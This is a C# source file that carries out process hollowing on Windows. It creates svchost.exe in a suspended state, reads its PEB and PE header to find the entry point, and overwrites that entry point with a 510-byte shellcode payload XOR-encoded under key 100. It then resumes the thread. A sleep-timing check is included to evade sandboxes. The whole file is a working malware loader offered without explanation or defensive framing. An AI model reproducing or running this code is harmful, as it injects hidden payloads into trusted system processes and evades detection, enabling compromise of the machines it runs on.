using System;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;

namespace Process_Hollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        static byte[] decode(byte[] payload, int key)
        {
            for (int i = 0; i < payload.Length; i++)
            {
                payload[i] ^= (byte)key;
            }
            return payload;
        }
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (!CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("CreateProcess failed");
            }
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            IntPtr hprocess = pi.hProcess;
            uint tmp = 0;
            ZwQueryInformationProcess(hprocess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToBaseAdress = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addr_buf = new byte[IntPtr.Size];
            IntPtr num;
            ReadProcessMemory(hprocess, ptrToBaseAdress, addr_buf, addr_buf.Length, out num);
            IntPtr svchostbase = (IntPtr)BitConverter.ToInt64(addr_buf, 0);
            byte[] buf = new byte[0x200];
            IntPtr tmp2;
            ReadProcessMemory(hprocess, svchostbase, buf, buf.Length, out tmp2);
            uint e_lfanew_offset = (uint)BitConverter.ToInt64(buf, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = (uint)BitConverter.ToInt64(buf, (int)opthdr);
            IntPtr EntryPonitAdress = (IntPtr)((UInt64)svchostbase + entrypoint_rva);

            byte[] buf1 = new byte[510] {
0x98,0x2c,0xe7,0x80,0x94,0x8c,0xa8,0x64,0x64,0x64,0x25,0x35,0x25,
0x34,0x36,0x2c,0x55,0xb6,0x01,0x2c,0xef,0x36,0x04,0x2c,0xef,0x36,
0x7c,0x35,0x32,0x2c,0xef,0x36,0x44,0x29,0x55,0xad,0x2c,0xef,0x16,
0x34,0x2c,0x6b,0xd3,0x2e,0x2e,0x2c,0x55,0xa4,0xc8,0x58,0x05,0x18,
0x66,0x48,0x44,0x25,0xa5,0xad,0x69,0x25,0x65,0xa5,0x86,0x89,0x36,
0x2c,0xef,0x36,0x44,0xef,0x26,0x58,0x2c,0x65,0xb4,0x25,0x35,0x02,
0xe5,0x1c,0x7c,0x6f,0x66,0x6b,0xe1,0x16,0x64,0x64,0x64,0xef,0xe4,
0xec,0x64,0x64,0x64,0x2c,0xe1,0xa4,0x10,0x03,0x2c,0x65,0xb4,0x20,
0xef,0x24,0x44,0x2d,0x65,0xb4,0xef,0x2c,0x7c,0x34,0x87,0x32,0x2c,
0x9b,0xad,0x25,0xef,0x50,0xec,0x2c,0x65,0xb2,0x29,0x55,0xad,0x2c,
0x55,0xa4,0x25,0xa5,0xad,0x69,0xc8,0x25,0x65,0xa5,0x5c,0x84,0x11,
0x95,0x28,0x67,0x28,0x40,0x6c,0x21,0x5d,0xb5,0x11,0xbc,0x3c,0x20,
0xef,0x24,0x40,0x2d,0x65,0xb4,0x02,0x25,0xef,0x68,0x2c,0x20,0xef,
0x24,0x78,0x2d,0x65,0xb4,0x25,0xef,0x60,0xec,0x2c,0x65,0xb4,0x25,
0x3c,0x25,0x3c,0x3a,0x3d,0x3e,0x25,0x3c,0x25,0x3d,0x25,0x3e,0x2c,
0xe7,0x88,0x44,0x25,0x36,0x9b,0x84,0x3c,0x25,0x3d,0x3e,0x2c,0xef,
0x76,0x8d,0x2f,0x9b,0x9b,0x9b,0x39,0x2d,0xda,0x13,0x17,0x56,0x3b,
0x57,0x56,0x64,0x64,0x25,0x32,0x2d,0xed,0x82,0x2c,0xe5,0x88,0xc4,
0x65,0x64,0x64,0x2d,0xed,0x81,0x2d,0xd8,0x66,0x64,0x64,0x34,0x6e,
0x6e,0x74,0xe1,0x25,0x30,0x2d,0xed,0x80,0x28,0xed,0x95,0x25,0xde,
0x28,0x13,0x42,0x63,0x9b,0xb1,0x28,0xed,0x8e,0x0c,0x65,0x65,0x64,
0x64,0x3d,0x25,0xde,0x4d,0xe4,0x0f,0x64,0x9b,0xb1,0x0e,0x6e,0x25,
0x3a,0x34,0x34,0x29,0x55,0xad,0x29,0x55,0xa4,0x2c,0x9b,0xa4,0x2c,
0xed,0xa6,0x2c,0x9b,0xa4,0x2c,0xed,0xa5,0x25,0xde,0x8e,0x6b,0xbb,
0x84,0x9b,0xb1,0x2c,0xed,0xa3,0x0e,0x74,0x25,0x3c,0x28,0xed,0x86,
0x2c,0xed,0x9d,0x25,0xde,0xfd,0xc1,0x10,0x05,0x9b,0xb1,0xe1,0xa4,
0x10,0x6e,0x2d,0x9b,0xaa,0x11,0x81,0x8c,0xf7,0x64,0x64,0x64,0x2c,
0xe7,0x88,0x74,0x2c,0xed,0x86,0x29,0x55,0xad,0x0e,0x60,0x25,0x3c,
0x2c,0xed,0x9d,0x25,0xde,0x66,0xbd,0xac,0x3b,0x9b,0xb1,0xe7,0x9c,
0x64,0x1a,0x31,0x2c,0xe7,0xa0,0x44,0x3a,0xed,0x92,0x0e,0x24,0x25,
0x3d,0x0c,0x64,0x74,0x64,0x64,0x25,0x3c,0x2c,0xed,0x96,0x2c,0x55,
0xad,0x25,0xde,0x3c,0xc0,0x37,0x81,0x9b,0xb1,0x2c,0xed,0xa7,0x2d,
0xed,0xa3,0x29,0x55,0xad,0x2d,0xed,0x94,0x2c,0xed,0xbe,0x2c,0xed,
0x9d,0x25,0xde,0x66,0xbd,0xac,0x3b,0x9b,0xb1,0xe7,0x9c,0x64,0x19,
0x4c,0x3c,0x25,0x33,0x3d,0x0c,0x64,0x24,0x64,0x64,0x25,0x3c,0x0e,
0x64,0x3e,0x25,0xde,0x6f,0x4b,0x6b,0x54,0x9b,0xb1,0x33,0x3d,0x25,
0xde,0x11,0x0a,0x29,0x05,0x9b,0xb1,0x2d,0x9b,0xaa,0x8d,0x58,0x9b,
0x9b,0x9b,0x2c,0x65,0xa7,0x2c,0x4d,0xa2,0x2c,0xe1,0x92,0x11,0xd0,
0x25,0x9b,0x83,0x3c,0x0e,0x64,0x3d,0x2d,0xa3,0xa6,0x94,0xd1,0xc6,
0x32,0x9b,0xb1
};

            IntPtr nread;
            WriteProcessMemory(hprocess, EntryPonitAdress, decode(buf1, 100), buf1.Length, out nread);
            ResumeThread(pi.hThread);

        }
    }
}